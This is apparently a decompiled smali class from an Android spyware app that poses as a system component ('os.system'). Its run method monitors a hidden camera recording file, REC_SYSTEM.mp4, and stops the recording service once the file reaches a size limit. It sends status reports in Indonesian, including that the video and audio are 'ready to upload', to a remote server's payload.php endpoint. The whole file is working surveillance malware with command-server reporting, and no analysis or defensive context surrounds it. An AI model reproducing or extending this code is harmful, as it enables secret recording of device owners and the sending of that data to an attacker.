.class Los/system/SystemThread$3;
.super Ljava/lang/Object;
.source "SystemThread.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/SystemThread;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/SystemThread;


# direct methods
.method constructor <init>(Los/system/SystemThread;)V
    .locals 0

    .prologue
    .line 122
    iput-object p1, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    .line 125
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$800(Los/system/SystemThread;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v1}, Los/system/SystemThread;->access$700(Los/system/SystemThread;)Ljava/lang/Runnable;

    move-result-object v1

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 127
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v2}, Los/system/SystemThread;->access$300(Los/system/SystemThread;)Los/system/ReceiverBoot;

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/REC_SYSTEM.mp4"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 128
    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    .line 129
    sget-object v2, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "cam size: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 131
    const-wide/16 v2, 0x0

    cmp-long v2, v0, v2

    if-nez v2, :cond_1

    .line 132
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$800(Los/system/SystemThread;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v1}, Los/system/SystemThread;->access$700(Los/system/SystemThread;)Ljava/lang/Runnable;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 134
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    iget-object v1, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    const-string v4, "camera video system alert tidak support(coba lagi) gunakan alternatif camera foto"

    invoke-virtual {v3, v4}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 150
    :cond_0
    :goto_0
    return-void

    .line 136
    :cond_1
    invoke-static {}, Los/system/SystemThread;->access$900()I

    move-result v2

    int-to-long v2, v2

    cmp-long v2, v0, v2

    if-lez v2, :cond_2

    .line 137
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$800(Los/system/SystemThread;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v1}, Los/system/SystemThread;->access$700(Los/system/SystemThread;)Ljava/lang/Runnable;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 139
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$1000(Los/system/SystemThread;)Los/system/CamRuntime$LocalBinder;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 140
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v0}, Los/system/SystemThread;->access$1000(Los/system/SystemThread;)Los/system/CamRuntime$LocalBinder;

    move-result-object v0

    invoke-virtual {v0}, Los/system/CamRuntime$LocalBinder;->matikan()V

    .line 141
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    iget-object v1, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    invoke-static {v1}, Los/system/SystemThread;->access$1100(Los/system/SystemThread;)Landroid/content/ServiceConnection;

    move-result-object v1

    invoke-virtual {v0, v1}, Los/system/SystemThread;->unbindService(Landroid/content/ServiceConnection;)V

    .line 142
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Los/system/SystemThread;->access$1002(Los/system/SystemThread;Los/system/CamRuntime$LocalBinder;)Los/system/CamRuntime$LocalBinder;

    .line 144
    iget-object v0, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    iget-object v1, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    const-string v4, "camera video/audio SELESAI [siap diupload]"

    invoke-virtual {v3, v4}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 148
    :cond_2
    iget-object v2, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    iget-object v3, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/payload.php?outpayload="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Los/system/SystemThread$3;->this$0:Los/system/SystemThread;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "rekam size:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "null"

    invoke-virtual {v2, v3, v0, v1}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0
.end method
